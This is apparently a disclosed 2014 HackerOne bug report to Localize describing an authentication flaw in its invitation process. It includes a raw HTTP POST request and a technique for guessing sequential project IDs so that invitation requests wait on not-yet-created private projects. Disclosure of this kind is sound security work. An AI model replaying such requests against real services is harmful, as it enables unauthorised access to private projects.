@@ -1,0 +1,49 @@
+ReportLink:https://hackerone.com/reports/9088
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/faisalahmed
+ReportedTo:Localize(localize)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:23.04.2014 4:58:59
+
+Summary:
+
+Hei,
+How you doing ?
+
+just found another bug on **Invitation Process**.
+This one is really interesting!
+
+With this bug, Attacker can send **invitation request** to a project that is even not created yet :p
+
+POC
+------
+
+Process is same as other two issues that i reported earlier,
+* Just send an **Invitation Request" to a private Project and use the POST Data to reproduce (with Live HTTP Header or any other Request Repeater).
+
+POST : https://www.localize.im/projects/[Project ID]
+>
+Host: www.localize.im
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://www.localize.im/projects/[ID]
+Cookie: PHPSESSID=hp7c6gvbb93nu4o29tim85s3o5
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
+
+> CSRFToken=[TOKEN]&requestInvitation[repositoryID]=[ID]
+
+Here, suppose ID of last Project created on Localize is `9a` , now as localize application normally works, next ID will be `9b` .. (i can be wrong here)
+with Live HTTP Header, You can Send Requests to project that is not even created till now.. all you have to do is just change the ID parameter to `9b` `9c` `9d` `9e` `9f` more and more and send request.
+Now when Project with ID `9b` `9c` `9d` `9e` `9f` will get created, doesn't matter this project is `PUBLIC` or `PRIVATE` (because of that bug i reported earlier), there will be an "Invitation Request" awaiting for confirmation.
+
+Hope you will fix this one soon as possible..
+
+Regards and Best Wishes,
+FaisaL Ahmed
